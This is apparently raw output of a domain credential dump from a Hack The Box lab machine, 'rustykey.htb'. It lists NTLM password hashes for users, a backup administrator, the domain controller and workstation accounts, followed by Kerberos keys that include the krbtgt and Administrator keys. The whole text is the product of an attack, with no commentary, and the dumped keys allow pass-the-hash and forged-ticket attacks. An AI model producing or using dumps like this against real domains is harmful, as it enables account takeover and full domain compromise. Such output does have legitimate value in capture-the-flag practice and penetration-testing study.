rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
[*] Kerberos keys grabbed
Administrator:des-cbc-md5:e007705d897310cd
krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a
krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af
krbtgt:des-cbc-md5:d6d062fd1fd32a64
rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1
rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9
rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8
rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945
rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b
rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d
rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7
rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29
rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8
rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43
rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661
rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358
DC$:des-cbc-md5:915d9d52a762675d
Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc
Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203
Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9
Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828
Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616
Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d
Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954
Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1
Support-Computer3$:des-cbc-md5:c13edcfe4676f86d
Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e
Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047
Support-Computer4$:des-cbc-md5:3b79647680e0d57a
Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42
Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89
Support-Computer5$:des-cbc-md5:73abb53162d51fb3
Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918
Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea
Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df
Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703
Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78
Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c
Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d
Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466
Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba
Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f
Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951
Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49
Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de
Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc
Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd
IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e
IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676
IT-Computer1$:des-cbc-md5:019d29370ece8002
IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa
IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7
IT-Computer2$:des-cbc-md5:622f2ae961abe932
IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb
IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3
IT-Computer3$:des-cbc-md5:f7025180cd23e5f1
IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc
IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a
IT-Computer4$:des-cbc-md5:bf58cb437340cd3d
IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8
IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a
IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7
